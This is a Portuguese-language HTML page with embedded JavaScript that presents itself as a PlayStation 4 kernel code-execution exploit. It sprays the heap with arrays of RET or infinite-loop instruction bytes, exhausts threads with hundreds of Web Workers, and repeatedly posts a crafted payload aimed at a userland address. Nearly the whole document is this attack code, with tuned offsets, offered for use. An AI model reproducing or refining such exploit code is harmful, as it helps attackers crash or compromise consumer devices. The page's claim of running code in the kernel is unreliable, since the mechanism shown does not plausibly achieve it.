<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 KERNEL REALITY CHECK</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; text-align: center; padding: 20px; }
        h1 { font-size: 2em; color: #fff; border-bottom: 1px solid #555; padding-bottom: 10px; }
        .box { border: 1px solid #333; padding: 20px; margin: 20px auto; max-width: 600px; }
        
        button {
            font-size: 1.5em; padding: 15px 30px; margin: 10px; cursor: pointer;
            border: none; font-weight: bold; width: 100%;
        }
        
        #btn-life { background: #004; color: #0ff; border: 1px solid #0ff; }
        #btn-life:hover { background: #006; box-shadow: 0 0 10px #0ff; }

        #btn-freeze { background: #400; color: #f00; border: 1px solid #f00; }
        #btn-freeze:hover { background: #600; box-shadow: 0 0 10px #f00; }

        #status { margin-top: 20px; font-size: 1.2em; color: #888; }
        .running { color: #ff0 !important; font-weight: bold; }
    </style>
</head>
<body>

    <h1>TESTE DE REALIDADE (RCE)</h1>

    <div class="box">
        <p>Escolha o destino do processador:</p>
        
        <button id="btn-life" onclick="runExploit(0xC3C3C3C3)">
            MODO 1: RET (Vida)<br>
            <span style="font-size:0.6em">Instrução 0xC3 - O console deve sobreviver.</span>
        </button>

        <button id="btn-freeze" onclick="runExploit(0xFEEBFEEB)">
            MODO 2: LOOP (Congelamento)<br>
            <span style="font-size:0.6em">Instrução 0xEB 0xFE - O console deve travar TOTALMENTE.</span>
        </button>
    </div>

    <div id="status">Aguardando escolha...</div>

    <script>
        // CONFIGURAÇÃO ESTÁVEL (Baseada nos seus testes)
        const TARGET_LIMIT = 417; 
        const SPRAY_SIZE = 512;
        const TARGET_OFFSET = 384; 
        const ADDR_BYTE_3 = 0x40; // Endereço do Userland 0x40...

        let workers = [];
        let heapSpray = [];
        
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        async function runExploit(instruction) {
            // 1. Limpeza
            workers.forEach(w => w.terminate());
            workers = [];
            heapSpray = [];
            
            document.getElementById('status').innerText = "1. INJETANDO SHELLCODE NO NAVEGADOR...";
            document.getElementById('status').className = "running";

            // Pequeno delay para UI atualizar
            await new Promise(r => setTimeout(r, 100));

            // 2. Prepara o Userland com a instrução escolhida
            try {
                for(let i=0; i<800; i++) {
                    let arr = new Uint32Array(0x4000); 
                    // Enche com a instrução escolhida (RET ou LOOP)
                    arr.fill(instruction); 
                    heapSpray.push(arr);
                }
            } catch(e) {
                document.getElementById('status').innerText = "ERRO: OOM (Reinicie o navegador)";
                return;
            }

            document.getElementById('status').innerText = "2. ENCHENDO KERNEL...";
            
            // 3. Enche a tabela de threads
            let fillInterval = setInterval(() => {
                if (workers.length < TARGET_LIMIT) {
                    workers.push(new Worker(url));
                } else {
                    clearInterval(fillInterval);
                    document.getElementById('status').innerText = "3. ESTABILIZANDO (4s)...";
                    setTimeout(() => triggerAttack(), 4000);
                }
            }, 30);
        }

        function triggerAttack() {
            document.getElementById('status').innerText = ">>> EXECUTANDO CÓDIGO NO KERNEL <<<";
            
            // Payload que aponta para o Shellcode
            const payload = new Uint8Array(SPRAY_SIZE);
            payload.fill(0x00); 
            payload[TARGET_OFFSET] = 0x00;
            payload[TARGET_OFFSET+1] = 0x00;
            payload[TARGET_OFFSET+2] = 0x00;
            payload[TARGET_OFFSET+3] = ADDR_BYTE_3; // 0x40

            // Dispara
            setInterval(() => {
                const w = new Worker(killerUrl);
                w.terminate();
                try {
                    if(workers.length > 0) workers[0].postMessage(payload);
                } catch(e){}
            }, 10);
        }

    </script>
</body>
</html>
